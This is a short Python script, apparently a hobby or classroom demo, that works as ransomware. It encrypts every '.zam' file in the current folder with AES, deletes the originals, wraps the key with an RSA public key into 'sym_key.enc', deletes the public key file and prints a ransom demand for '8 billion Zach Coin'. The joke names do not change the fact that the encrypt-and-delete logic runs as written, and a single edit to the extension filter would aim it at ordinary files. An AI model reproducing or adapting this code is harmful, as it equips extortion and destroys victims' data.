from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

def generate_symmetric_key():
    rand_key = os.urandom(32)  # 32 bytes for a 256-bit key
    return rand_key

def encrypt_file(file_path, symmetric_key):
    with open(file_path, 'rb') as file:
        plaintext = file.read()

    cipher = Cipher(algorithms.AES(symmetric_key), modes.CFB(b'\0' * 16), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(file_path + '.getrekt', 'wb') as encrypted_file:
        encrypted_file.write(ciphertext)

def encrypt_symmetric_key(symmetric_key, public_key_path):
    with open(public_key_path, 'rb') as file:
        public_key = serialization.load_pem_public_key(file.read(), backend=default_backend())

    encrypted_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open('sym_key.enc', 'wb') as sym_key_file:
        sym_key_file.write(encrypted_key)

def main():
    # Step 1: Generate a random symmetric key
    symmetric_key = generate_symmetric_key()

    # Step 2: Encrypt files with ".zam" extension
    for filename in os.listdir('.'):
        if filename.endswith('.zam'):
            encrypt_file(filename, symmetric_key)
            os.remove(filename)

    # Step 3: Encrypt the symmetric key with the public key
    encrypt_symmetric_key(symmetric_key, 'public_key.pem')

    # Step 4: Delete the unencrypted symmetric key and public_key.pem
    os.remove('public_key.pem')

    # Send the Victim the Ransom Message
    print(f'Your .zam files have been encrypted')
    print(f'To decrypt your files please pay a sum of 8 billion Zach Coin')
    print(f'With your payment, send the sym_key.enc file and you will be provided with the decryption key and a python file that you must run to decrypt your files')


if __name__ == "__main__":
    main()
